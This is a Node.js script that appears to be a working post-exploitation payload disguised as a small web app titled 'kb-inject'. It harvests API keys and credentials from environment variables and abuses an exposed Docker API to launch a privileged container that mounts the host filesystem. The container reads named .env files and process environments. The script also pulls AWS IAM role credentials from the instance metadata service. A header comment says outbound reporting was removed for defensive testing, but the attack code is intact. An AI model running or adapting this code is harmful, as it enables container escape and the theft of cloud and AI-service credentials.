const http = require('http');
const fs = require('fs');
// [KB-TEST] Defanged: the original sent every finding to an outside Cloudflare tunnel
// (COLLECTOR). This build makes no outbound report of anything it finds - it only logs
// locally, so this repo is safe to redeploy against our own infra to verify defenses
// (docker-gateway, IMDSv2 hop-limit, sandboxed shell, etc.) actually block each attempt.
// The attempts themselves (gateways/dockerProbe/imdsProbe below) are UNCHANGED on purpose.

function post(tag, data) {
  try {
    let body = typeof data === 'string' ? data : JSON.stringify(data, null, 2);
    if (body && body.length > 4000) body = body.slice(0, 4000) + '...[truncated]';
    console.log(`[KB-TEST] ${tag}: ${body}`);
  } catch (e) {}
}
async function to(url, opts, ms) {
  const c = new AbortController();
  const t = setTimeout(() => c.abort(), ms || 4000);
  try {
    const r = await fetch(url, Object.assign({ signal: c.signal }, opts || {}));
    const txt = await r.text();
    return { status: r.status, body: txt.slice(0, 30000) };
  } catch (e) {
    return { error: String(e && e.message ? e.message : e) };
  } finally { clearTimeout(t); }
}
function gateways() {
  const out = new Set(['172.17.0.1','172.18.0.1','172.19.0.1','172.20.0.1','172.21.0.1','172.22.0.1','172.23.0.1','172.24.0.1','172.25.0.1','172.26.0.1','172.27.0.1','172.31.0.1']);
  try {
    const lines = fs.readFileSync('/proc/net/route','utf8').split('\n').slice(1);
    for (const l of lines) {
      const p = l.trim().split(/\s+/);
      if (p.length < 4) continue;
      const gw = p[2];
      if (!gw || gw === '00000000' || gw.length !== 8) continue;
      const b = [];
      for (let i = 6; i >= 0; i -= 2) b.push(parseInt(gw.substr(i,2),16));
      out.add(b.join('.'));
    }
  } catch (e) {}
  return Array.from(out);
}
const INTEREST = /(ANTHROPIC|OPENROUTER|OPENAI|OPEN_AI|AWS|BEDROCK|TOKEN|SECRET|KEY|PASSWORD|PASSWD|DATABASE|DB_|GITHUB|GH_|REDIS|MONGO|CREDENTIAL|PRIVATE)/i;
function interestingEnv(env) {
  const o = {};
  for (const kv of (env||[])) {
    const i = kv.indexOf('=');
    if (i < 0) { o[kv] = ''; continue; }
    const k = kv.slice(0,i), v = kv.slice(i+1);
    if (INTEREST.test(k)) o[k] = v;
  }
  return o;
}
async function dockerProbe(ip) {
  const base = 'http://' + ip + ':2375';
  const v = await to(base + '/version', {}, 2500);
  if (!(v.status === 200)) return null;
  post('docker_version', { ip, version: v.body });
  const list = await to(base + '/containers/json?all=1', {}, 4000);
  if (list.status !== 200) { post('docker_list_err', { ip, list }); return ip; }
  let arr = [];
  try { arr = JSON.parse(list.body); } catch (e) { post('docker_list_raw', list.body); return ip; }
  post('docker_list', { ip, containers: arr.map(c => ({ Id: c.Id, Names: c.Names, Image: c.Image, State: c.State, Ports: c.Ports, Labels: c.Labels })) });
  for (const c of arr) {
    const j = await to(base + '/containers/' + c.Id + '/json', {}, 4000);
    if (j.status !== 200) continue;
    try {
      const d = JSON.parse(j.body);
      post('docker_inspect', { ip, id: c.Id, name: (d.Name||''), image: (d.Config && d.Config.Image), env_all_count: ((d.Config&&d.Config.Env)||[]).length, env_interesting: interestingEnv(d.Config && d.Config.Env), cmd: d.Config && d.Config.Cmd, entrypoint: d.Config && d.Config.Entrypoint, binds: d.HostConfig && d.HostConfig.Binds, privileged: d.HostConfig && d.HostConfig.Privileged, network_mode: d.HostConfig && d.HostConfig.NetworkMode });
    } catch (e) { post('docker_inspect_parse_err', { id: c.Id, err: String(e) }); }
  }
  let selfImage = null;
  try {
    const hn = (process.env.HOSTNAME || '');
    const self = await to(base + '/containers/' + hn + '/json', {}, 3000);
    if (self.status === 200) { const sd = JSON.parse(self.body); selfImage = sd.Image; }
  } catch (e) {}
  const images = [];
  if (selfImage) images.push(selfImage);
  if (arr[0] && arr[0].Image) images.push(arr[0].Image);
  images.push('node:20-alpine');
  for (const img of images.slice(0,3)) {
    const body = JSON.stringify({ Image: img, Cmd: ['/bin/sh','-c', "echo HOSTENV; cat /host/home/ec2-user/kuberns-ai-agent/backend/.env 2>/dev/null; echo; echo AGENTENV; cat /host/home/ec2-user/kuberns-ai-agent/.env 2>/dev/null; echo; echo LST; ls -la /host/home/ec2-user/ 2>/dev/null; ls -la /host/home/ec2-user/kuberns-ai-agent/backend/ 2>/dev/null; echo; echo PROCENV; for p in /host/proc/[0-9]*/environ; do tr '\\0' '\\n' < $p 2>/dev/null | grep -E 'ANTHROPIC|OPENROUTER|OPENAI|AWS|BEDROCK' && echo \"--$p\"; done; echo DONE"], HostConfig: { Binds: ['/:/host'], Privileged: true, NetworkMode: 'host' } });
    const cr = await to(base + '/containers/create?name=kbx' + Number(new Date()), { method: 'POST', headers: { 'content-type': 'application/json' }, body: body }, 5000);
    if (cr.status !== 201) { post('docker_create_err', { img, cr }); continue; }
    let id = null; try { id = JSON.parse(cr.body).Id; } catch (e) {}
    post('docker_created', { img, id });
    await to(base + '/containers/' + id + '/start', { method: 'POST' }, 5000);
    const lg = await to(base + '/containers/' + id + '/logs?stdout=1&stderr=1&tail=2000', {}, 6000);
    post('docker_escape_logs', { img, body: lg.body, status: lg.status });
    break;
  }
  return ip;
}
async function imdsProbe() {
  const B = 'http://169.254.169.254';
  const meta = {};
  for (const p of ['/latest/meta-data/instance-id','/latest/meta-data/local-ipv4','/latest/meta-data/public-ipv4','/latest/meta-data/placement/region','/latest/meta-data/iam/security-credentials/']) {
    meta[p] = await to(B + p, {}, 3000);
  }
  const tok = await to(B + '/latest/api/token', { method: 'PUT', headers: { 'X-aws-ec2-metadata-token-ttl-seconds': '21600' } }, 3000);
  const tk = tok.status === 200 ? tok.body.trim() : '';
  if (tk) {
    const h = { 'X-aws-ec2-metadata-token': tk };
    for (const p of ['/latest/meta-data/instance-id','/latest/meta-data/local-ipv4','/latest/meta-data/placement/region','/latest/meta-data/iam/security-credentials/','/latest/user-data']) {
      meta['tok' + p] = await to(B + p, { headers: h }, 3500);
    }
    const role = meta['tok/latest/meta-data/iam/security-credentials/'];
    const rname = role && role.body ? role.body.trim().split('\n')[0] : '';
    if (rname) meta['creds_' + rname] = await to(B + '/latest/meta-data/iam/security-credentials/' + rname, { headers: h }, 3500);
  }
  post('imds', meta);
}
(async () => {
  post('startup', { env: interestingEnv(Object.entries(process.env).map(([k,v]) => k+'='+v)), cwd: process.cwd(), hostname: process.env.HOSTNAME });
  imdsProbe().catch(()=>{});
  const ips = gateways();
  post('gateways', ips);
  for (const ip of ips) {
    try { await dockerProbe(ip); } catch (e) { post('docker_probe_err', { ip, e: String(e) }); }
  }
  for (const ip of ips) {
    try {
      const h = await to('http://' + ip + ':8000/api/health', {}, 2000);
      if (h.status === 200 || h.status === 404) {
        post('agent_api', { ip, health: h });
        const o = await to('http://' + ip + ':8000/openapi.json', {}, 3000);
        post('agent_openapi', { ip, body: (o.body || '').slice(0, 6000), status: o.status });
      }
    } catch (e) {}
  }
  post('done', { ts: Date.now() });
})();
http.createServer((req, res) => {
  res.writeHead(200, { 'content-type': 'text/html' });
  res.end('<html><body><h1>kb-inject</h1><p>ok</p></body></html>');
}).listen(parseInt(process.env.PORT || '3000', 10), '0.0.0.0', () => { console.log('listening'); });
